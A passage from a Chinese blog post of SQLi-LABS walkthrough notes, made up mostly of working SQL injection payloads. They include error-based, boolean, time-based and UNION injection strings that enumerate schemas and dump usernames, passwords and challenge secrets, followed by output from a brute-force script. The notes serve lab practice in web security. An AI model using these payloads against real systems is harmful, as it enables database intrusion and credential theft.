+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?sort=1 or updatexml(1,concat(0x7e,database(),0x7e),1)-- -</span><br><span class="line">?sort=1&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1)-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?sort=3 and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))-- -</span><br><span class="line">?sort=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))-- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?sort=2 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)-- -</span><br><span class="line">?sort=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)-- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?sort=2 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7e))-- -</span><br><span class="line">?sort=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7e))-- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?sort=2 and updatexml(1,concat(0x7e,(select concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users limit 0,1),0x7e),1)-- -</span><br><span class="line">?sort=1&#x27; and updatexml(1,concat(0x7e,(select concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users limit 0,1),0x7e),1)-- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-48、Less-49、Less-50、Less-51、Less-52、Less-53"><a href="#Less-48、Less-49、Less-50、Less-51、Less-52、Less-53" class="headerlink" title="Less-48、Less-49、Less-50、Less-51、Less-52、Less-53"></a>Less-48、Less-49、Less-50、Less-51、Less-52、Less-53</h4><p>是<strong>GET</strong>请求，并且不会把sql的报错显示到前台来。</p>
+<p>主要是把参数拼接到<code>order by</code>后面。但是<code>order by</code>后面加<code>and</code>、<code>or</code>不太行的样子，所以用<code>rand()</code>函数或者时间注入。</p>
+<p>Less-50、Less51、Less-52、Less-53 是使用 <code>mysqli_multi_query()</code> 函数，可以进行堆叠注入</p>
+<p>Less-48、Less-50、Less-52</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?sort=rand(ascii(substr(database(),1,1))=115)</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?sort=rand(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105)</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?sort=rand(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1))=101)</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有列名</span><br><span class="line">?sort=rand(ascii(substr((select group_concat(column_name) from information_schema.columns  where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),1,1))=105)</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有数据</span><br><span class="line">?sort=rand(ascii(substr((select group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users),1,1))=49)</span><br></pre></td></tr></table></figure>
+
+<p>Less-49、Less-51</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?sort=1&#x27; and if((ascii(substr(database(),1,1))=115),sleep(0.5),1) -- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?sort=1&#x27; and if((ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105),sleep(0.5),1) -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?sort=1&#x27; and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1))=101),sleep(0.5),1) -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有列名</span><br><span class="line">?sort=1&#x27; and if((ascii(substr((select group_concat(column_name) from information_schema.columns  where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),1,1))=105),sleep(0.5),1) -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有数据</span><br><span class="line">?sort=1&#x27; and if((ascii(substr((select group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users),1,1))=49),sleep(0.5),1) -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h4><p>在10次内爆出数据库名字叫做 challenges 里面的密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; or 1=1 -- -</span><br><span class="line">?id=0&#x27; union select 9,(select group_concat(table_name) from information_schema.tables where table_schema=database()),8-- -</span><br><span class="line">?id=0&#x27; union select 9,(select group_concat(column_name) from information_schema.columns where table_name=&quot;ud6lcybzt9&quot;),8-- -</span><br><span class="line">?id=0&#x27; union select 9,(select group_concat(id,0x7e,sessid,0x7e,secret_4LB6,0x7e,tryy) from challenges.ud6lcybzt9),8-- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-55、Less-56、Less-57"><a href="#Less-55、Less-56、Less-57" class="headerlink" title="Less-55、Less-56、Less-57"></a>Less-55、Less-56、Less-57</h4><p>在14次内爆出数据库名字叫做 challenges 里面的密钥</p>
+<p>Less-55的闭合方式是 <code>()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0) or 1=1 -- -</span><br><span class="line">?id=0) union select 9,(select group_concat(table_name) from information_schema.tables where table_schema=database()),8-- -</span><br><span class="line">?id=0) union select 9,(select group_concat(column_name) from information_schema.columns where table_name=&quot;nv912wl3o8&quot;),8-- -</span><br><span class="line">?id=0) union select 9,(select group_concat(id,0x7e,sessid,0x7e,secret_38PU,0x7e,tryy) from challenges.nv912wl3o8),8-- -</span><br></pre></td></tr></table></figure>
+
+<p>Less-56的闭合方式是 <code>(&#39;&#39;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;) or 1=1 -- -</span><br><span class="line">?id=0&#x27;) union select 9,(select group_concat(table_name) from information_schema.tables where table_schema=database()),8-- -</span><br><span class="line">?id=0&#x27;) union select 9,(select group_concat(column_name) from information_schema.columns where table_name=&quot;t75zt03vvz&quot;),8-- -</span><br><span class="line">?id=0&#x27;) union select 9,(select group_concat(id,0x7e,sessid,0x7e,secret_9E2I,0x7e,tryy) from challenges.t75zt03vvz),8-- -</span><br></pre></td></tr></table></figure>
+
+<p>Less-57的闭合方式是 <code>(&quot;&quot;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot; or 1=1 -- -</span><br><span class="line">?id=0&quot; union select 9,(select group_concat(table_name) from information_schema.tables where table_schema=database()),8-- -</span><br><span class="line">?id=0&quot; union select 9,(select group_concat(column_name) from information_schema.columns where table_name=&quot;19fslr8a5t&quot;),8-- -</span><br><span class="line">?id=0&quot; union select 9,(select group_concat(id,0x7e,sessid,0x7e,secret_155N,0x7e,tryy) from challenges.19fslr8a5t),8-- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-58、Less-59、Less-60、Less-61"><a href="#Less-58、Less-59、Less-60、Less-61" class="headerlink" title="Less-58、Less-59、Less-60、Less-61"></a>Less-58、Less-59、Less-60、Less-61</h4><p>在5次内爆出数据库名字叫做 challenges 里面的密钥</p>
+<p>后台对将查询结果输出到前台进行了设置，不会直接显示到前台，所以用报错注入</p>
+<p>Less-58是单引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; or 1=1 -- -</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat(database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询当前的数据库名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) -- -</span><br><span class="line"># 查询当前数据库中的所有表名（updatexml()有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;msmv5552ok&#x27;),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询指定数据库中的指定数据表的所有列名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(secret_H9EQ) from challenges.msmv5552ok),0x7e))) -- -</span><br><span class="line"># 查询指定数据库中的指定数据表的数据（extractvalue()和updatexml()都有长度限制，最多32位）</span><br></pre></td></tr></table></figure>
+
+<p>Less-59是无闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id=0 or 1=1 -- -</span><br><span class="line"></span><br><span class="line">?id=1 and (select 1 from (select count(*),concat(database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询当前的数据库名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1 and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) -- -</span><br><span class="line"># 查询当前数据库中的所有表名（updatexml()有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">?id=1 and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;xu8v5zrass&#x27;),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询指定数据库中的指定数据表的所有列名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1 and (extractvalue(1,concat(0x7e,(select group_concat(secret_NUBA) from challenges.xu8v5zrass),0x7e))) -- -</span><br><span class="line"># 查询指定数据库中的指定数据表的数据（extractvalue()和updatexml()都有长度限制，最多32位）</span><br></pre></td></tr></table></figure>
+
+<p>Less-60是 <code>(&quot;&quot;)</code> 闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;) or 1=1 -- -</span><br><span class="line"></span><br><span class="line">?id=1&quot;) and (select 1 from (select count(*),concat(database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询当前的数据库名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1&quot;) and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) -- -</span><br><span class="line"># 查询当前数据库中的所有表名（updatexml()有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">?id=1&quot;) and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;0ytjy8chkf&#x27;),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询指定数据库中的指定数据表的所有列名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1&quot;) and (extractvalue(1,concat(0x7e,(select group_concat(secret_74ZM) from challenges.0ytjy8chkf),0x7e))) -- -</span><br><span class="line"># 查询指定数据库中的指定数据表的数据（extractvalue()和updatexml()都有长度限制，最多32位）</span><br></pre></td></tr></table></figure>
+
+<p>Less-61是 <code>((&#39;&#39;))</code> 闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)) or 1=1 -- -</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and (select 1 from (select count(*),concat(database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询当前的数据库名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) -- -</span><br><span class="line"># 查询当前数据库中的所有表名（updatexml()有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ymbsul8bo6&#x27;),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询指定数据库中的指定数据表的所有列名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and (extractvalue(1,concat(0x7e,(select group_concat(secret_YMOJ) from challenges.ymbsul8bo6),0x7e))) -- -</span><br><span class="line"># 查询指定数据库中的指定数据表的数据（extractvalue()和updatexml()都有长度限制，最多32位）</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-62、Less-63、Less-64、Less-65"><a href="#Less-62、Less-63、Less-64、Less-65" class="headerlink" title="Less-62、Less-63、Less-64、Less-65"></a>Less-62、Less-63、Less-64、Less-65</h4><p>在130次内爆出数据库名字叫做 challenges 里面的密钥</p>
+<p>后台对将查询结果输出到前台进行了设置，不会直接显示到前台，并且数据库报错也不会显示到前台，所以只能用布尔注入</p>
+<p>Less-62是 <code>(&#39;&#39;)</code> 闭合</p>
+<p>Less-63是 <code>&#39;&#39;</code> 闭合</p>
+<p>Less-64是 <code>(())</code> 闭合</p>
+<p>Less-64是 <code>(&quot;&quot;)</code> 闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">database()</span><br><span class="line"></span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;603l3q6q5t&#x27;</span><br><span class="line"></span><br><span class="line">select group_concat(secret_YMOJ) from challenges.603l3q6q5t</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用脚本刷的，想要在130次内爆出的话，需要仔细看一下后端代码</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">====================== RESTART: E:\Python\PythonFiles\1.py =====================</span><br><span class="line">0txdhrp07l</span><br><span class="line">共发送了 108 次请求</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">====================== RESTART: E:\Python\PythonFiles\1.py =====================</span><br><span class="line">id,sessid,secret_MSYM,tryy</span><br><span class="line">共发送了 222 次请求</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">====================== RESTART: E:\Python\PythonFiles\1.py =====================</span><br><span class="line">8hVdzvct9LYzdyFadAYmKVlH</span><br><span class="line">共发送了 263 次请求</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQLi-LABS%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" rel="tag"># SQLi-LABS通关笔记</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="信息收集">
+                  <i class="fa fa-angle-left"></i> 信息收集
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/28/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/" rel="next" title="抓包工具">
+                  抓包工具 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
